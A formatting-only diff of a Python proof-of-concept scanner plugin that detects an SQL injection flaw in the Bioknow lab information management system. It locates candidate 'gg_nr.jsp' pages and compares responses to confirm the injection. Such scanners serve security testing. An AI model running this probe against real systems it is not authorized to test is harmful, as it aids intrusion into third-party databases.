@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import re
 
+
 class Vuln(ABVuln):
-    vuln_id = 'Bioknow_0002' # 平台漏洞编号，留空
+    vuln_id = 'Bioknow_0002'  # 平台漏洞编号，留空
     name = '百奥知实验室综合信息管理系统 SQL注射'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2015-04-14'  # 漏洞公布时间
     desc = '''
         百奥知实验室综合信息管理系统：
@@ -22,6 +23,7 @@ class Vuln(ABVuln):
     product = '百奥知实验室综合信息管理系统'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
 
+
 def matchurl(arg):
     hh = hackhttp.hackhttp()
     arg = arg + '/portal/'
@@ -29,16 +31,19 @@ def matchurl(arg):
     m = re.findall('/portal/root/(.*?)/', res)
     m1 = []
     for data in m:
-        if data in m1:pass
-        else :m1.append(data)
-     
-    urllist = []  
+        if data in m1:
+            pass
+        else:
+            m1.append(data)
+
+    urllist = []
     for data in m1:
         url = arg + '/root/' + data + '/gg_nr.jsp'
         code, head, res, errcode, _ = hh.http(url)
-        if code ==200 :
+        if code == 200:
             urllist.append(url)
     return urllist
+
 
 class Poc(ABPoc):
     poc_id = '8c13e0a4-666f-4ee5-b620-dcebbfe37780'
@@ -52,8 +57,8 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #refer:http://www.wooyun.org/bugs/wooyun-2010-0107168
+
+            # refer:http://www.wooyun.org/bugs/wooyun-2010-0107168
             hh = hackhttp.hackhttp()
             arglist = matchurl(self.target)
             for arg in arglist:
@@ -66,7 +71,7 @@ class Poc(ABPoc):
                 m1 = re.search('class="paper"', res1)
                 m2 = re.search('class="paper"', res2)
 
-                if code1 == 200 and code2 ==200 and m1 and m2==None:
+                if code1 == 200 and code2 == 200 and m1 and m2 == None:
                     #security_hole(arg +'?id=1'+'  :found sql Injection')
                     self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                         target=self.target, name=self.vuln.name))
@@ -76,6 +81,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
